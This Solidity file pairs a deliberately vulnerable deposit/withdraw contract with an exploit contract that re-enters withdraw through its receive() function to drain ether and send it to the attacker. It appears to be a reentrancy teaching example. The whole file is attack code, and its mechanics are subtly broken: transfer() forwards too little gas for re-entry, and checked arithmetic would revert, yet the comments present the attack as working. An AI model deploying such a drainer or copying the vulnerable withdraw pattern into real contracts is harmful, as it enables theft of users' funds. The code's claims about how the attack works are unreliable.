// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract ReentrancyVulnerableContract {
    mapping(address => uint256) public balances;

    constructor() payable {}

    // Function to deposit Ether into the contract
    function deposit() public payable {
        require(msg.value > 0, "Must send some ether");
        balances[msg.sender] += msg.value;
    }

    // Vulnerable withdraw function
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Transfer the amount to the caller
        // Vulnerable to reentrancy
        payable(msg.sender).transfer(amount);

        // Update the balance after transfer
        balances[msg.sender] -= amount;
    }

    // Function to get balance of an address
    function getBalance(address user) public view returns (uint256) {
        return balances[user];
    }
}

contract ReentrancyExploit {
    ReentrancyVulnerableContract public vulnerableContract;
    address public attacker;
    uint256 public amountToDrain;

    constructor(address _vulnerableContract) {
        vulnerableContract = ReentrancyVulnerableContract(_vulnerableContract);
        attacker = msg.sender;
    }

    // Fallback function to perform reentrancy attack
    receive() external payable {
        if (address(vulnerableContract).balance >= amountToDrain) {
            vulnerableContract.withdraw(amountToDrain);
        }
    }

    // Function to initiate the attack
    function attack(uint256 amount) public payable {
        require(msg.sender == attacker, "Only attacker can call this function");
        require(msg.value >= amount, "Need to send enough ether to attack");

        amountToDrain = amount;
        
        // Deposit ether to vulnerable contract
        vulnerableContract.deposit{value: msg.value}();

        // Start the reentrancy attack
        vulnerableContract.withdraw(amountToDrain);
    }

    // Function to retrieve drained funds
    function withdrawFunds() public {
        require(msg.sender == attacker, "Only attacker can call this function");
        payable(attacker).transfer(address(this).balance);
    }
}
